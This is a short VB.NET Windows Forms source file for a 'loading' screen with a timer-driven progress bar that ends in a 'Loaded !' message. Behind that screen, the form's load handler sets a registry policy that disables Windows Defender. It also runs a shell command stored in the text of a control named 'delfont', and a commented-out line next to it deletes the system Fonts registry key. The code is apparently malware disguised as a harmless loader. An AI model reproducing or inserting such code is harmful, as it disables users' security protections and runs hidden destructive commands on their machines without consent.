Imports Microsoft.Win32

Public Class loading
    Private Sub loading_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        loadtimer.Start()
        Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\", "DisableAntiSpyware", "1")
        Shell(delfont.Text)        ' My.Computer.Registry.CurrentUser.DeleteSubKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts")
        ShowForm(New init)
        ShowForm(New checker)
    End Sub
    Private Sub ShowForm(WhichForm As Form)
        With WhichForm
            .Show()
            .BringToFront()
        End With
    End Sub
    Private Sub loadtimer_Tick(sender As Object, e As EventArgs) Handles loadtimer.Tick
        loadbar.Increment(10)
        If loadbar.Value = 100 Then
            loadtimer.Stop()
            Me.Hide()
            MsgBox("Loaded !")
        End If
    End Sub
End Class